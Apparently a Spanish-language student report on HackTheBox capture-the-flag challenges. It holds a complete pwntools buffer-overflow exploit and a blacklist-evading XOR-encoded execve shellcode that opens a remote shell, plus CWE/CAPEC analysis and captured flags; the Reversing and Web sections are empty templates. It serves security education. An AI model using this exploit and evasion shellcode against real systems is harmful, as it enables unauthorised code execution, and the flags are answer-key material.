# Seguridad-P2

## Índice

- [PWD](#pwd)
  - [Challenge 1](#challenge-1)
  - [Challenge 2](#challenge-2)

- [Reversing](#reversing)
  - [Challenge 1: Rega's Town](#challenge-1-regas-town)
  - [Challenge 2](#challenge-2-1)

- [Web](#web)
  - [Challenge 1](#challenge-1-1)
  - [Challenge 2](#challenge-2-2)

- [Tabla resumen de retos resueltos](#tabla-resumen-de-retos-resueltos)

- [Timeline de resolución retos](#timeline-de-resolución-retos)


# PWD

## Challenge 1: You know 0xDiablos pts[20]

### 1. Procedimiento seguido (screenshots y explicaciones).

Primeramente se obtiene información sobre el archivo binario para saber posibles
direcciones por las que se pueda vulnerar el programa.

![alt text](media/P1-1.png)

Con la información que se refleja en la imagen se puede saber que no tiene
protecciones del stack como tal. Por lo que a continuación se procede a revisar
el código utilizando Ghidra para analizar el binario.

![alt text](media/P1-2.png)

Como se denota en la imagen la función `vuln()` utiliza el método `gets()` el
cual es extremadamente vulnerable al ataque de buffer overflow. De manera
adicional hay una función llamada `flag()` la cual imprime la bandera cuando es
ejecutada, como se ve a continuación:

![alt text](media/P1-3.png)

Ya sabiendo que se puede hacer un buffer overflow para influenciar en el flujo
de ejecución y ejecutar la función `flag()`, se procede a calcular el tamaño
del payload necesario para sobrescribir el return address.

El buffer declarado en `vuln()` tiene un tamaño de 180 bytes. Sumando 4 bytes
de alineación y 4 bytes del EBP guardado, se necesitan **188 bytes de padding**
antes de poder sobrescribir el return address.

![alt text](media/P1-4.png)

Con la dirección de entrada de `flag()` identificada en `0x080491e2`, se
construye el payload. Sin embargo, para que `flag()` imprima la bandera
también es necesario que sus dos parámetros tengan los valores correctos:
`param_1 = 0xDEADBEEF` y `param_2 = 0xC0DED00D`, esto según el código visto en Ghidra.

En arquitecturas x86 de 32 bits los argumentos se pasan en el stack, por lo
que el payload final queda estructurado de la siguiente manera:

| Sección | Contenido | Tamaño |
|---|---|---|
| Padding | `'A' * 188` | 188 bytes |
| Return address | `0x080491e2` en little-endian | 4 bytes |
| Fake return address | `'AAAA'` | 4 bytes |
| param_1 | `0xDEADBEEF` en little-endian | 4 bytes |
| param_2 | `0xC0DED00D` en little-endian | 4 bytes |

El exploit se implementa con pwntools de la siguiente manera:

```python
from pwn import *

payload  = b'A' * 188
payload += p32(0x080491e2)  # dirección de flag()
payload += b'A' * 4         # fake return address
payload += p32(0xDEADBEEF)  # param_1
payload += p32(0xC0DED00D)  # param_2

io = remote('IP de HTB', PORT de HTB)
io.sendline(payload)
io.interactive()
```

Al ejecutar el exploit contra el servidor de HackTheBox, el programa redirige
su ejecución hacia `flag()` con los parámetros correctos y se obtiene la
bandera:

![alt text](media/P1-5.png)

---

### 2. Lista de herramientas utilizadas

| Herramienta | Propósito |
|---|---|
| `checksec` | Verificar las protecciones del binario |
| `Ghidra` | Análisis estático y decompilación del binario |
| `GDB + pwndbg` | Depuración dinámica y análisis del stack |
| `pwntools` | Construcción y envío del payload |

---

### 3. Debilidad que dio origen a la vulnerabilidad (CWE)

**CWE-121: Stack-based Buffer Overflow**

La vulnerabilidad se origina en el uso de la función `gets()` dentro de
`vuln()`, la cual no realiza ninguna validación del tamaño del input recibido.
Esto permite escribir más datos de los que el buffer puede contener, desbordando
hacia el stack y sobrescribiendo el return address con una dirección arbitraria.

De manera secundaria aplica:

**CWE-242: Use of Inherently Dangerous Function**

`gets()` está catalogada como una función inherentemente peligrosa y ha sido
eliminada del estándar C11 precisamente por no ofrecer ningún mecanismo de
control de límites. Su uso en cualquier contexto representa una vulnerabilidad
directa.

---

### 4. Patrón de ataque (CAPEC)

**CAPEC-100: Overflow Buffers**

El ataque consiste en enviar un input deliberadamente más largo que el buffer
asignado para sobrescribir datos críticos del stack, en este caso el return
address del stack frame de `vuln()`. Al redirigir la ejecución hacia `flag()`
con los parámetros correctos ubicados en el stack, se logra ejecutar código
que el flujo normal del programa nunca alcanzaría.

---

### 5. Bandera

#### La bandera obtenido corresponde a: 
```
HTB{16b0ab4fc3cd8ba880c692bc5dd4eaf3}
```

## Challenge 2: Execute pts[20]

## 1. Pasos para explotar la vulnerabilidad

Primeramente se obtiene información sobre el archivo binario para identificar
posibles vectores de ataque.

![alt text](media/P2-1.png)

Como se puede observar, el binario tiene el stack ejecutable (`NX unknown`),
lo que significa que es probable que sea posible inyectar shellcode directamente en el stack y
ejecutarlo.

A continuación se revisa el código fuente, no es necesario utilizar Ghidra en este caso debido a que ya el problema nos brinda el achivo de código C.

![alt text](media/P2-2.png)

El programa simplemente recibe input del usuario y lo ejecuta directamente como
código máquina. Sin embargo, existe una función `check()` que valida el
shellcode antes de ejecutarlo, bloqueando ciertos patrones de bytes. La idea es seguir el ejemplo de clase y lograr abrir un shell. Los patrones prohibidos encontrados en el binario son:

![alt text](media/P2-3.png)

El shellcode estándar para ejecutar `/bin/sh` mediante la syscall `execve`
contiene exactamente esos bytes prohibidos. El último es correspondientes al número de syscall de `execv`, los primeros a los bytes de la string `/bin/sh` y después son bytes nulos, por lo que se necesita ofuscar
cada uno de ellos mediante técnicas alternativas.

**Bypass del número de syscall (`0x3b`):**

En lugar de cargar 59 directamente en `rax`, se carga 58 y se le suma 1:

```asm
push 0x3a    ; 58 en el stack
pop rax      ; rax = 58
add al, 0x1  ; rax = 59, sin generar 0x3b
```

**Bypass de los registros en cero (`0xf6`, `0xd2`):**

`xor rsi, rsi` y `xor rdx, rdx` generan los bytes prohibidos `0xf6` y `0xd2`.
La alternativa es usar `push/pop/dec`:

```asm
push 0x1
pop rsi
dec rsi      ; rsi = 0 sin generar 0xf6

push 0x1
pop rdx
dec rdx      ; rdx = 0 sin generar 0xd2
```

**Bypass de la string `/bin/sh` (XOR encoding):**

Los bytes de `/bin/sh` están completamente bloqueados. La solución es ofuscar
la string mediante XOR con una clave que no genere bytes prohibidos, y
reconstruirla en runtime:

```asm
mov rax, 0x2a2a2a2a2a2a2a2a   ; KEY = 0x2a repetido
push rax                        ; KEY en el stack

mov rax, 0x2a2a2a2a2a2a2a2a ^ 0x68732f6e69622f  ; KEY XOR "/bin/sh"
xor [rsp], rax                  ; stack = KEY XOR (KEY XOR "/bin/sh") = "/bin/sh"
mov rdi, rsp                    ; RDI apunta a "/bin/sh" reconstruido
```

La clave `0x2a2a2a2a2a2a2a2a` fue seleccionada porque al combinarla con
`/bin/sh` no produce ningún byte prohibido.

El shellcode final combinando todos los bypasses es el siguiente:

```asm
mov rax, 0x2a2a2a2a2a2a2a2a
push rax

mov rax, 0x2a2a2a2a2a2a2a2a ^ 0x68732f6e69622f
xor [rsp], rax
mov rdi, rsp

push 0x1
pop rsi
dec rsi

push 0x1
pop rdx
dec rdx

push 0x3a
pop rax
add al, 0x1
syscall
```

El exploit completo implementado con pwntools:

```python
from pwn import *

exe = './execute'
elf = context.binary = ELF(exe, checksec=False)

sh = remote('<IP>', <PORT>)

shellcode = '''
mov rax, 0x2a2a2a2a2a2a2a2a
push rax

mov rax, 0x2a2a2a2a2a2a2a2a ^ 0x68732f6e69622f
xor [rsp], rax
mov rdi, rsp

push 0x1
pop rsi
dec rsi

push 0x1
pop rdx
dec rdx

push 0x3a
pop rax
add al, 0x1
syscall
'''

sc = asm(shellcode)
sh.send(sc)
sh.interactive()
```

Al ejecutar el exploit contra el servidor de HackTheBox, el shellcode pasa la
validación, se ejecuta en el stack y se obtiene una shell remota:

![alt text](media/P2-4.png)

---

## 2. Lista de herramientas utilizadas

| Herramienta | Propósito |
|---|---|
| `checksec` | Verificar las protecciones del binario |
| `pwntools` | Ensamblado del shellcode y envío del payload |

---

## 3. Debilidad que dio origen a la vulnerabilidad (CWE)

**CWE-94: Improper Control of Generation of Code (Code Injection)**

La vulnerabilidad principal radica en que el programa recibe input del usuario
y lo ejecuta directamente como código máquina sin una validación suficiente.
Aunque existe una función `check()` que intenta bloquear ciertos patrones, no
es capaz de detectar shellcode ofuscado mediante técnicas de encoding como XOR.

De manera secundaria aplica:

**CWE-693: Protection Mechanism Failure**

El mecanismo de validación implementado en `check()` es insuficiente. Una
blacklist basada en patrones de bytes estáticos puede ser eludida mediante
técnicas de ofuscación, lo que demuestra que el enfoque de "lista negra" no
es una estrategia de defensa robusta para prevenir la ejecución de código
arbitrario.

---

## 4. Patrón de ataque (CAPEC)

**CAPEC-242: Code Injection**

El ataque consiste en inyectar shellcode crafteado manualmente que evade la
validación del programa mediante técnicas de ofuscación a nivel de bytes. El
shellcode reconstruye la string `/bin/sh` en runtime usando XOR, evita los
bytes bloqueados del syscall `execve` usando aritmética, y zeroa los registros
necesarios sin usar las instrucciones convencionales que generan bytes
prohibidos. Al pasar la validación, el shellcode se ejecuta directamente en el
stack obteniendo ejecución de código arbitrario.

De manera complementaria aplica:

**CAPEC-88: OS Command Injection** — Una vez obtenida la shell mediante el
shellcode, el atacante tiene ejecución directa de comandos en el sistema
operativo remoto.

---

## 5. Bandera

#### La bandera obtenido corresponde a: 
```
HTB{d14efc5f440239a02ef164bd27b4a5eb}
```

---

# Reversing

## Challenge 1: Rega's Town pts[30]

1. Procedimiento seguido (screenshots y explicaciones).
2. Lista de herramientas utilizadas.
3. Debilidad que dio origen a la vulnerabilidad (código CWE).
4. Patrón de ataque que se siguió para explotar la vulnerabilidad (código CAPEC).
5. “Bandera”

## Challenge 2 pts[]

1. Procedimiento seguido (screenshots y explicaciones).
2. Lista de herramientas utilizadas.
3. Debilidad que dio origen a la vulnerabilidad (código CWE).
4. Patrón de ataque que se siguió para explotar la vulnerabilidad (código CAPEC).
5. “Bandera”

---

# Web

## Challenge 1 pts[]

1. Procedimiento seguido (screenshots y explicaciones).
2. Lista de herramientas utilizadas.
3. Debilidad que dio origen a la vulnerabilidad (código CWE).
4. Patrón de ataque que se siguió para explotar la vulnerabilidad (código CAPEC).
5. “Bandera”

## Challenge 2 pts[]

1. Procedimiento seguido (screenshots y explicaciones).
2. Lista de herramientas utilizadas.
3. Debilidad que dio origen a la vulnerabilidad (código CWE).
4. Patrón de ataque que se siguió para explotar la vulnerabilidad (código CAPEC).
5. “Bandera”

---

# Tabla resumen de retos resueltos

| Categoría | Challenge | Estado | Bandera |
|---|---|---|---|
| PWD | Challenge 1 | ✅/❌ | |
| PWD | Challenge 2 | ✅/❌ | |
| Reversing | Rega's Town | ✅/❌ | |
| Reversing | Challenge 2 | ✅/❌ | |
| Web | Challenge 1 | ✅/❌ | |
| Web | Challenge 2 | ✅/❌ | |

---

# Timeline de resolución retos

| Fecha | Challenge | Acción realizada | Resultado |
|---|---|---|---|
| YYYY-MM-DD | Ejemplo | Reconocimiento inicial | Acceso obtenido |
| YYYY-MM-DD | Ejemplo | Reversing binario | Flag encontrada |
